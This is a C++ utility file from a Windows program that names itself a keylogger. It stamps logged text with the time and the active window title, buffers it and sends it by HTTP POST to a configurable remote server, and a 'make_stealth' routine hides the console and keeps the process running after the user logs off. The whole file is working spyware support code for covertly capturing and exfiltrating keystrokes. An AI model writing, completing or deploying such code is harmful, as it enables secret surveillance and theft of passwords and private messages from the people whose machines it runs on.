#include "utils.h"
#include "configuration.h"
#include <sstream>
#include <iomanip>
#include <vector>

std::wstring utils::get_timestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t_now = std::chrono::system_clock::to_time_t(now);
    
    std::wstringstream wss;
    std::tm tm_now;
    localtime_s(&tm_now, &time_t_now);
    
    wss << L"[" << std::put_time(&tm_now, L"%Y-%m-%d %H:%M:%S") << L"] ";
    return wss.str();
}

std::wstring utils::get_active_window_title() {
    HWND foreground = GetForegroundWindow();
    if (foreground) {
        wchar_t window_title[256];
        GetWindowTextW(foreground, window_title, 256);
        
        std::wstringstream wss;
        wss << L"[Window: " << window_title << L"] ";
        return wss.str();
    }
    return L"";
}

size_t write_callback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    return size * nmemb;
}

bool utils::send_logs_to_server(const std::wstring& logs, const std::string& server_url) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    // Convert wstring to string for curl
    std::string utf8_logs;
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, logs.c_str(), (int)logs.length(), NULL, 0, NULL, NULL);
    if (size_needed > 0) {
        utf8_logs.resize(size_needed);
        WideCharToMultiByte(CP_UTF8, 0, logs.c_str(), (int)logs.length(), &utf8_logs[0], size_needed, NULL, NULL);
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, server_url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, utf8_logs.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: text/plain");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    return (res == CURLE_OK);
}

void utils::safe_log_write(std::wofstream& stream, const std::wstring& content) {
    try {
        if (stream.is_open()) {
            stream << content;
            stream.flush();
            
            // Remote logging if enabled
            if (configuration::remote_logging_enabled) {
                static std::wstring buffer;
                buffer += content;
                
                // Send when buffer reaches threshold or contains newline
                if (buffer.size() > configuration::remote_buffer_threshold || buffer.find(L'\n') != std::wstring::npos) {
                    send_logs_to_server(buffer, configuration::server_url);
                    buffer.clear();
                }
            }
        }
    }
    catch (const std::exception&) {
        // Silent error handling - don't crash the keylogger
        // Could add local error logging here if needed
    }
}

bool utils::initialize_remote_logging() {
    if (configuration::remote_logging_enabled) {
        return (curl_global_init(CURL_GLOBAL_ALL) == CURLE_OK);
    }
    return true;
}

void utils::cleanup_remote_logging() {
    if (configuration::remote_logging_enabled) {
        curl_global_cleanup();
    }
}

void utils::make_stealth() {
    HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_HIDE);
    }
    
    // Make process high priority to avoid crashes
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    
    // Allocate console to background
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    // Ensure application keeps running even when user logs off
    SetProcessShutdownParameters(0x4FF, 0);
} 